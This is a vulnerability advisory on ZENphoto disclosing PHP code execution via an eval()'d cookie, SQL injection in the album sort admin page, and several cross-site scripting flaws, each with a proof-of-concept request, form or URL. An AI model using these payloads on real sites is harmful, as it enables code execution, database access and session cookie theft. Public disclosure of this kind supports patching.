Advisory Details:

High-Tech Bridge SA Security Research Lab has discovered multiple vulnerabilities in ZENphoto, which can be exploited to perform arbitrary PHP code execution, sql injection and cross site scripting attacks.

1) Arbitrary PHP Code Execution in ZENphoto: CVE-2012-0993

Input passed via "viewer_size_image_saved" COOKIE parameter is not properly sanitised before being used in an "eval()" call. 
This can be exploited to execute arbitrary PHP code.

The following PoC is available:


GET /[album_name]/[image.jpg].php HTTP/1.1
Cookie: viewer_size_image_saved=phpinfo()


Successful exploitation of this vulnerability requires that "viewer_size_image" plugin is enabled (disabled by default).

2) SQL Injection in ZENphoto: CVE-2012-0994

Input passed via the "sortableList" POST parameter to /zp-core/admin-albumsort.php is not properly sanitised before being used in a SQL query.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.


<form action="http://[host]/zp-core/admin-albumsort.php?page=edit&album=1&saved&tab=sort" method="post">
<input type="hidden" name="XSRFToken" value="[XSRFToken]">
<input type="hidden" name="sortableList" value="id[]=3&id[]=2 OR 1=(select min(@a:=1)from (select 1 union select 2)k group by (select concat(@@version,0x0,@a:=(@a-1)%2)))">
<input type="submit" id="btn"> 
</form>


Successful exploitation of this vulnerability requires the attacker to be logged-in and have access to "Manage Albums" function. 

3) Multiple XSS in ZENphoto: CVE-2012-0995

3.1 Input passed via the "msg" GET parameters to /zp-core/admin.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC is available:

http://[host]/zp-core/admin.php?action=external&error&msg=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E

This vulnerability can be used against any logged-in user. 

3.2 Input appended to the URL is not properly sanitised before being returned to the user. 
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC is available:

http://[host]/1/xxx%3Cimg+src=x+onerror=alert%28document.cookie%29%3E/

3.3 Input appended to the URL after /zp-core/admin.php is not properly sanitised before being returned to the user.  
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC is available:

http://[host]/zp-core/admin.php?a=&quot;&gt;&lt;script&gt;alert%28document.cookie%29&lt;/script&gt;

3.4 Input passed via the "album" GET parameters to /zp-core/admin-edit.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC is available:

http://[host]/zp-core/admin-edit.php?page=edit&album=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&uploaded&subpage=1&tab=imageinfo&albumimagesort=id_desc
